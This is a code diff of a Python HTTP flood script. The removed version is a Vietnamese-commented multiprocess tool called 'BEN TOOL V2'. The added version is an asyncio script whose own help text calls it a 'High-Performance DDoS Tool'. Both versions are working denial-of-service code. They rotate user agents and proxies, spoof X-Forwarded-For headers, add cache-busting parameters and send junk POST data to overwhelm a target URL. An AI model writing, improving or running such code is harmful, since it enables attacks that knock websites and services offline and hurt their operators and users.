@@ -1,234 +1,105 @@
 import asyncio
 import aiohttp
-import time
 import random
-import string
-import os
+import signal
+from fake_useragent import UserAgent
 import sys
-import multiprocessing
-import logging
-from colorama import Fore, Style, init
+import argparse
 
-# === CẤU HÌNH BAN ĐẦU ===
-init(autoreset=True)
-logging.getLogger("asyncio").setLevel(logging.CRITICAL)
+# Configuration
+TARGET_URL = "http://example.com"  # Replace with target URL
+REQUESTS_PER_SECOND = 100000  # Target RPS (adjust based on system capabilities)
+TOTAL_REQUESTS = 1000000  # Total requests to send (0 = infinite)
+PROXIES = []  # Add proxies if available (format: 'http://ip:port')
+THREADS = 200  # Number of concurrent workers
 
-# List Method hỗ trợ
-METHODS = ["GET", "POST", "HEAD"]
+ua = UserAgent(fallback="Mozilla/5.0")
+STOP_FLAG = False
 
-DEFAULT_UAS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
-]
+def signal_handler(sig, frame):
+    global STOP_FLAG
+    print("\n[!] Attack stopped by user.")
+    STOP_FLAG = True
 
-# === HÀM HỖ TRỢ (UTILS) ===
-def load_file(filename):
-    """Đọc file thành list, bỏ qua dòng trống"""
-    if os.path.exists(filename):
-        try:
-            with open(filename, "r", encoding="utf-8") as f:
-                return [line.strip() for line in f if line.strip()]
-        except:
-            pass
-    return []
+signal.signal(signal.SIGINT, signal_handler)
 
-def random_string(length=10):
-    letters = string.ascii_letters + string.digits
-    return ''.join(random.choice(letters) for _ in range(length))
+def generate_random_headers():
+    headers = {
+        "User-Agent": ua.random,
+        "Accept": random.choice(["*/*", "text/html", "application/xhtml+xml"]),
+        "Accept-Language": random.choice(["en-US,en;q=0.5", "fr-FR,fr;q=0.9"]),
+        "Accept-Encoding": "gzip, deflate",
+        "Connection": random.choice(["keep-alive", "close"]),
+        "Upgrade-Insecure-Requests": "1",
+        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
+    }
+    return headers
 
-def get_target_url(base_url):
-    """Tạo URL với tham số ngẫu nhiên để né cache"""
-    separator = "&" if "?" in base_url else "?"
-    return f"{base_url}{separator}{random_string(3)}={random_string(5)}"
+def generate_random_payload():
+    payload = {"data": "X" * random.randint(100, 1000)}
+    return payload
 
-# === XỬ LÝ REQUEST (CORE) ===
-async def attack_worker(target_url, counter, user_agents, proxies, method_mode, duration):
-    """
-    Worker xử lý request bất đồng bộ.
-    - method_mode: 'GET', 'POST', 'HEAD' hoặc 'RANDOM'
-    """
-    
-    # Cấu hình Connector tối ưu tốc độ
-    connector = aiohttp.TCPConnector(
-        limit=0,              # Không giới hạn connection pool
-        ttl_dns_cache=300,    # Cache DNS lâu hơn
-        ssl=False,            # Bỏ qua check SSL
-        enable_cleanup_closed=True
-    )
-    
-    timeout = aiohttp.ClientTimeout(total=10, connect=5, sock_read=5)
-    
-    # Thời điểm dừng
-    stop_time = time.time() + duration
-
-    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        while time.time() < stop_time:
+async def worker(session, sem):
+    global STOP_FLAG
+    while not STOP_FLAG:
+        async with sem:
             try:
-                # 1. Chọn Proxy (Nếu có)
-                proxy = random.choice(proxies) if proxies else None
+                proxy = random.choice(PROXIES) if PROXIES else None
+                method = random.choice(["GET", "POST"])
+                headers = generate_random_headers()
+                params = {"random": random.randint(1, 1000000)} if method == "GET" else None
+                data = generate_random_payload() if method == "POST" else None
                 
-                # 2. Chọn User-Agent
-                ua = random.choice(user_agents) if user_agents else random.choice(DEFAULT_UAS)
-                
-                # 3. Chọn Method
-                if method_mode == "RANDOM":
-                    method = random.choice(METHODS)
+                if proxy:
+                    async with session.request(method, TARGET_URL, headers=headers, params=params, data=data, proxy=proxy, timeout=5) as resp:
+                        if resp.status == 503:
+                            print(f"[!] Server unavailable (503) - Status: {resp.status}")
+                        elif resp.status >= 400:
+                            print(f"[!] Error {resp.status} - {method} {TARGET_URL}")
+                        else:
+                            print(f"[+] Success {resp.status} - {method} {TARGET_URL}")
                 else:
-                    method = method_mode
+                    async with session.request(method, TARGET_URL, headers=headers, params=params, data=data, timeout=5) as resp:
+                        if resp.status == 503:
+                            print(f"[!] Server unavailable (503) - Status: {resp.status}")
+                        elif resp.status >= 400:
+                            print(f"[!] Error {resp.status} - {method} {TARGET_URL}")
+                        else:
+                            print(f"[+] Success {resp.status} - {method} {TARGET_URL}")
+            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+                if "Connection reset by peer" in str(e):
+                    print(f"[!] Connection reset - {method} {TARGET_URL}")
+                else:
+                    print(f"[!] Error: {e}")
+            except Exception as e:
+                print(f"[!] Unexpected error: {e}")
 
-                # 4. Chuẩn bị Headers & Url
-                headers = {
-                    "User-Agent": ua,
-                    "Cache-Control": "no-cache",
-                    "Connection": "keep-alive",
-                    "Accept-Encoding": "gzip, deflate", # Nén dữ liệu để truyền nhanh hơn
-                }
-                
-                url = get_target_url(target_url)
-                
-                # 5. Gửi Request
-                # Nếu là POST thì gửi thêm data rác
-                data = None
-                if method == "POST":
-                    data = {random_string(5): random_string(10) for _ in range(3)}
-
-                async with session.request(method, url, headers=headers, proxy=proxy, data=data) as response:
-                    # Chỉ cần đọc 1 byte đầu hoặc status để tiết kiệm băng thông
-                    await response.read() 
-                    # Hoặc chỉ cần await response.text() nếu server trả về nhỏ
-                    
-                    if response.status < 500: # Tính là thành công nếu server phản hồi
-                        with counter.get_lock():
-                            counter.value += 1
-            except:
-                # Lỗi kết nối, lỗi proxy, timeout -> Bỏ qua để loop tiếp
-                pass
-
-async def process_starter(target_url, concurrency, counter, user_agents, proxies, method, duration):
-    sys.stderr = open(os.devnull, 'w') # Silent error
-    tasks = []
-    # Tạo hàng loạt task chạy song song trong 1 process
-    for _ in range(concurrency):
-        tasks.append(asyncio.create_task(attack_worker(target_url, counter, user_agents, proxies, method, duration)))
-    await asyncio.gather(*tasks)
-
-def run_process_wrapper(target_url, concurrency, counter, user_agents, proxies, method, duration):
-    # Fix policy cho Windows
-    if sys.platform == 'win32':
-        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
-    try:
-        asyncio.run(process_starter(target_url, concurrency, counter, user_agents, proxies, method, duration))
-    except:
-        pass
-
-# === GIAO DIỆN & MONITOR ===
-def monitor(counter, total_threads, ua_count, proxy_count, method, duration):
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print(Fore.CYAN + f"""
-    ██████╗ ███████╗███╗   ██╗
-    ██╔══██╗██╔════╝████╗  ██║
-    ██████╔╝█████╗  ██╔██╗ ██║
-    ██╔══██╗██╔══╝  ██║╚██╗██║
-    ██████╔╝███████╗██║ ╚████║
-    ╚═════╝ ╚══════╝╚═╝  ╚═══╝
-      BEN TOOL V2 - {method} MODE
-    """)
-    print(Fore.YELLOW + f"  [INFO] UA: {ua_count} | Proxy: {proxy_count} | Threads: {total_threads}")
-    print(Fore.YELLOW + f"  [INFO] Method: {method} | Time: {duration}s")
-    # Thêm dòng yếu tố ảnh hưởng theo yêu cầu
-    print(Fore.RED + "  [!] Yếu tố ảnh hưởng: Requests/giây (Rất lớn) | Kết nối đồng thời (Rất nhiều) | Xử lý backend (Nặng)")
-    print(Fore.MAGENTA + "="*65)
-    print(Fore.GREEN + f"{'ELAPSED':^10} | {'TOTAL REQS':^20} | {'SPEED (Req/s)':^20}")
-    print(Fore.MAGENTA + "="*65)
+async def main():
+    global STOP_FLAG
+    parser = argparse.ArgumentParser(description="High-Performance DDoS Tool")
+    parser.add_argument("--url", required=True, help="Target URL")
+    parser.add_argument("--rps", type=int, default=REQUESTS_PER_SECOND, help="Requests per second")
+    parser.add_argument("--total", type=int, default=TOTAL_REQUESTS, help="Total requests (0=infinite)")
+    parser.add_argument("--threads", type=int, default=THREADS, help="Number of workers")
+    args = parser.parse_args()
     
-    start_time = time.time()
-    last_count = 0
+    TARGET_URL = args.url
+    REQUESTS_PER_SECOND = args.rps
+    TOTAL_REQUESTS = args.total
+    THREADS = args.threads
     
-    while True:
-        time.sleep(1)
-        current = counter.value
-        rps = current - last_count
-        last_count = current
-        elapsed = int(time.time() - start_time)
-        
-        # Màu sắc dựa trên tốc độ
-        rps_color = Fore.GREEN
-        if rps > 1000: rps_color = Fore.YELLOW
-        if rps > 5000: rps_color = Fore.RED
-
-        print(f" {str(elapsed)+'s':^9} | {f'{current:,}':^19} | {rps_color}{f'{rps:,}':^19}{Style.RESET_ALL}")
-        
-        if elapsed >= duration:
-            break
-
-def main():
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print(Fore.CYAN + "=== BEN TOOL V2 (UPGRADED) ===")
-
-    # 1. Load Resources
-    user_agents = load_file("ua.txt")
-    proxies = load_file("proxy.txt") # Format: http://ip:port hoặc http://user:pass@ip:port
+    print(f"[+] Starting DDoS attack on {TARGET_URL}")
+    print(f"[+] Target RPS: {REQUESTS_PER_SECOND} | Total Requests: {TOTAL_REQUESTS if TOTAL_REQUESTS > 0 else 'infinite'}")
     
-    print(Fore.GREEN + f"-> Loaded {len(user_agents)} UA.")
-    print(Fore.GREEN + f"-> Loaded {len(proxies)} Proxies.")
-    if len(proxies) == 0:
-        print(Fore.RED + "[!] Cảnh báo: Không có Proxy, IP của bạn sẽ dễ bị chặn!")
-
-    # 2. Input cấu hình
-    while True:
-        url = input(Fore.WHITE + "URL mục tiêu: ").strip()
-        if not url: continue
-        if not url.startswith("http"): url = "http://" + url
-        break
+    connector = aiohttp.TCPConnector(limit_per_host=0, ssl=False)
+    timeout = aiohttp.ClientTimeout(total=None, sock_connect=5, sock_read=5)
     
-    print(Fore.WHITE + "\nChọn Method:")
-    print("1. GET (Mặc định - Nhanh)")
-    print("2. POST (Gửi data rác - Tốn resource server)")
-    print("3. HEAD (Chỉ lấy header - Cực nhanh)")
-    print("4. RANDOM (Kết hợp tất cả)")
-    choice = input("Lựa chọn (1-4): ").strip()
+    sem = asyncio.Semaphore(REQUESTS_PER_SECOND // 10)  # Control connection rate
     
-    method_map = {"1": "GET", "2": "POST", "3": "HEAD", "4": "RANDOM"}
-    method = method_map.get(choice, "GET")
+    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+        tasks = [worker(session, sem) for _ in range(THREADS)]
+        await asyncio.gather(*tasks)
 
-    try:
-        duration = int(input("Thời gian chạy (giây): ").strip())
-    except:
-        duration = 60
-
-    # 3. Tính toán luồng
-    cpu_count = os.cpu_count() or 4
-    # Số luồng trên mỗi core. Tăng lên nếu mạng khỏe, giảm đi nếu máy lag.
-    # Với requests có proxy, cần nhiều luồng hơn để bù delay.
-    threads_per_core = 300 
-    total_threads = cpu_count * threads_per_core
+if __name__ == "__main__":
+    asyncio.run(main())
     
-    print(Fore.GREEN + f"\n-> Khởi chạy {total_threads} luồng async trên {cpu_count} CPU core...")
-    time.sleep(1)
-
-    # 4. Chạy Multiprocessing
-    counter = multiprocessing.Value('i', 0)
-    processes = []
-    
-    for _ in range(cpu_count):
-        p = multiprocessing.Process(
-            target=run_process_wrapper, 
-            args=(url, threads_per_core, counter, user_agents, proxies, method, duration)
-        )
-        p.daemon = True
-        p.start()
-        processes.append(p)
-        
-    try:
-        monitor(counter, total_threads, len(user_agents), len(proxies), method, duration)
-    except KeyboardInterrupt:
-        pass
-    finally:
-        print(Fore.RED + "\n\n[!] ĐÃ DỪNG TOOL.")
-        for p in processes: p.terminate()
-
-if __name__ == '__main__':
-    multiprocessing.freeze_support()
-    sys.stderr = open(os.devnull, 'w')
-    try: main()
-    except: pass
